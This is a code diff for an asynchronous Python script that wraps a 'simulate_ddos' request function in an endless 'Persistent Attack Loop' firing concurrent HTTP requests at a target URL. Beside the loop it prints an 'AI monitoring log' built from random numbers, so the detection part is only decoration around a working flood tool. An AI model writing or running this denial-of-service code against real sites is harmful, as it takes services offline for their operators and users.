@@ -70,20 +70,26 @@ async def simulate_ddos(session, url):
     except Exception:
         pass
 
-# --- MAIN EXECUTION ---
+# --- Persistent Attack Loop ---
 async def run_attack(target_url):
     connector = TCPConnector(limit=NUM_ATTACK_TASKS)
     async with ClientSession(connector=connector) as session:
-        tasks = [simulate_ddos(session, target_url) for _ in range(NUM_ATTACK_TASKS)]
-        await asyncio.gather(*tasks)
+        try:
+            while True:
+                tasks = [simulate_ddos(session, target_url) for _ in range(NUM_ATTACK_TASKS)]
+                await asyncio.gather(*tasks)
 
-    rps = random.uniform(100, 1000)
-    entropy = round(random.uniform(3.0, 5.0), 2)
-    print("--- BEGIN AI MONITORING LOG (PROJECT CHIMERA) ---")
-    if analyze_traffic(rps, NUM_ATTACK_TASKS, entropy):
-        print(f"STATUS: !!! APPLICATION LAYER ATTACK DETECTED !!! Rate: {int(rps)} rps | IPs: {NUM_ATTACK_TASKS} | Entropy: {entropy}")
-    else:
-        print(f"STATUS: Normal traffic | Rate: {int(rps)} rps | IPs: {NUM_ATTACK_TASKS} | Entropy: {entropy}")
+                rps = random.uniform(100, 1000)
+                entropy = round(random.uniform(3.0, 5.0), 2)
+                print("--- BEGIN AI MONITORING LOG (PROJECT CHIMERA) ---")
+                if analyze_traffic(rps, NUM_ATTACK_TASKS, entropy):
+                    print(f"STATUS: !!! APPLICATION LAYER ATTACK DETECTED !!! Rate: {int(rps)} rps | IPs: {NUM_ATTACK_TASKS} | Entropy: {entropy}")
+                else:
+                    print(f"STATUS: Normal traffic | Rate: {int(rps)} rps | IPs: {NUM_ATTACK_TASKS} | Entropy: {entropy}")
+
+                await asyncio.sleep(1)  # Optional: throttle loop slightly
+        except KeyboardInterrupt:
+            print("Interrupted by user. Stopping attack...")
 
 # --- ENTRY POINT ---
 async def main():
